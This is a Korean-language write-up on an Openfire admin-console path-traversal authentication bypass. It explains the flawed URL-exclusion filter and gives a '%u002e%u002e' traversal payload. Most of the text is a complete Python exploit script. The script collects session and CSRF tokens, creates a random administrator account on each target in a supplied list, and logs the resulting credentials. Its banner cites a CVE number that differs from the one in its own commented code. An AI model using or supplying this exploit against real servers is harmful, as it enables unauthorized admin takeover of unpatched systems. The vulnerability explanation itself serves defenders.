자이브 소프트웨어(Jive Software)의 실시간 협업 서버
- XMPP(Extensible Messaging and Presence Protocol) 프로토콜을 기반으로 하는 오픈 소스 실시간 협업 서버

- 취약한 버전의 Openfire 관리 콘솔 페이지에서 설정 환경을 통한 경로 탐색이 가능한 취약점

> 해당 취약점은 2023년 패치 보안 업데이트를 발표하였으며, 해당 업데이트를 적용하지 않은 서버를 대상으로 공격 수행

> 최근 국가 배후 해킹조직에서 해당 취약점을 악용한 정황이 포착
> - 해당 취약점은 "testURLPassesExclude" 메소드에서 URL에 대한 입력값 검증이 부족하여 발생

> doFilter()는 HTTP 요청을 가로채 입력값 검증, 권한 검증 등을 수행하는 것으로 판단됨

> testURLPassesExclude 메소드는 doFilter()에 의해 호출

> testURLPassesExclude는 URL에서 ".." 또는 "%2e (디코딩 .)" 문자열만 필터링하며 그 외 추가적인 필터링은 존재하지 않음

```
public static boolean testURLPassesExclude(String url, String exclude) {
        // If the exclude rule includes a "?" character, the url must exactly match the exclude rule.
        // If the exclude rule does not contain the "?" character, we chop off everything starting at the first "?"
        // in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a "*"
        // character then the URL is allowed if it exactly matches everything before the * and there are no ".."
        // characters after the "*". All data in the URL before
        if (exclude.endsWith("*")) {
            if (url.startsWith(exclude.substring(0, exclude.length()-1))) {
                // Now make suxre that there are no ".." characters in the rest of the URL.
                if (!url.contains("..") && !url.toLowerCase().contains("%2e")) {
                    return true;
                }
            }
        }
        else if (exclude.contains("?")) {
            if (url.equals(exclude)) {
                return true;
            }
        }
        else {
            int paramIndex = url.indexOf("?");
            if (paramIndex != -1) {
                url = url.substring(0, paramIndex);
            }
            if (url.equals(exclude)) {
                return true;
            }
        }
        return false;
    }
```
```
[Target IP]/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```
```
BurpSuite를 이용해 plugin-admin.jsp 요청을 전송하여 JSESSION ID 및 CSRF와 같은 필요한 세션 토큰을 획득
```

- 획득한 세션 토큰을 이용해 user-create.jsp 요청을 전송하여 새로운 관리자 계정 생성

- test 계정으로 정상 접근 및 관리자 권한을 가진 것을 확인

```
import random
import string
import argparse
from concurrent.futures import ThreadPoolExecutor
import HackRequests

artwork = '''

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
                                                                                                       
Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
Use at your own risk!
'''

def generate_random_string(length):
    charset = string.ascii_lowercase + string.digits
    return ''.join(random.choice(charset) for _ in range(length))

def between(string, starting, ending):
    s = string.find(starting)
    if s < 0:
        return ""
    s += len(starting)
    e = string[s:].find(ending)
    if e < 0:
        return ""
    return string[s : s+e]

final_result = []

def exploit(target):
    hack = HackRequests.hackRequests()
    host = target.split("://")[1]

    # setup 1: get csrf + jsessionid
    jsessionid = ""
    csrf = ""

    try:
        url = f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "DNT": "1",
            "X-Forwarded-For": "1.2.3.4",
            "Upgrade-Insecure-Requests": "1"
        }
        print(f"[..] Checking target: {target}")
        hh = hack.http(url, headers=headers)
        jsessionid = hh.cookies.get('JSESSIONID', '')
        csrf = hh.cookies.get('csrf', '')

        if jsessionid != "" and csrf != "":
            print(f"Successfully retrieved JSESSIONID: {jsessionid} + csrf: {csrf}")
        else:
            print("Failed to get JSESSIONID and csrf value")
            return
        
        # setup 2: add user
        username = generate_random_string(6)
        password = generate_random_string(6)
        
        header2 = {
            "Host": host,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close",
            "Cookie": f"JSESSIONID={jsessionid}; csrf={csrf}",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "DNT": "1",
            "X-Forwarded-For": "1.2.3.4",
            "Upgrade-Insecure-Requests": "1"
        }

        create_user_url= f"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={username}&name=&email=&password={password}&passwordConfirm={password}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"
        hhh = hack.http(create_user_url, headers=header2)

        if hhh.status_code == 200:
            print(f"User added successfully: url: {target} username: {username} password: {password}")
            with open("success.txt", "a+") as f:
                f.write(f"url: {target} username: {username} password: {password}\n")
        else:
            print("Failed to add user")
        # setup 3: add plugin

    except Exception as e:
        print(f"Error occurred while retrieving cookies: {e}")

def main():
    print(artwork)

    ## parse argument
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The URL of the target, eg: http://127.0.0.1:9090', default=False)
    parser.add_argument("-l", "--list", action="store", help="List of target url saperated with new line", default=False)
    args = parser.parse_args()

    if args.target is not False:
        exploit(args.target) 
	
    elif args.list is not False:
        with open(args.list) as targets:
            for target in targets:
                target = target.rstrip()
                if target == "":
                    continue
                if "http" not in target:
                    target = "http://" + target
                exploit(target) 
    else:
        parser.print_help()
        parser.exit()

# def main():
#     parser = argparse.ArgumentParser(description="CVE-2023-32315")
#     parser.add_argument("-u", help="Target URL")
#     parser.add_argument("-l", help="File containing URLs")
#     parser.add_argument("-t", type=int, default=10, help="Number of threads")

#     args = parser.parse_args()

#     target_url = args.u
#     file_path = args.l
#     thread = args.t

#     targets = []

#     if target_url is None:
#         with open(file_path, "r") as file:
#             for line in file:
#                 target = line.strip()
#                 if target == "":
#                     continue
#                 if "http" not in target:
#                     target = "http://" + target
#                 targets.append(target)

#         with ThreadPoolExecutor(max_workers=thread) as executor:
#             for target in targets:
#                 executor.submit(exploit, target)
                

#     else:
#         exploit(target_url)

if __name__ == "__main__":
    main()
```
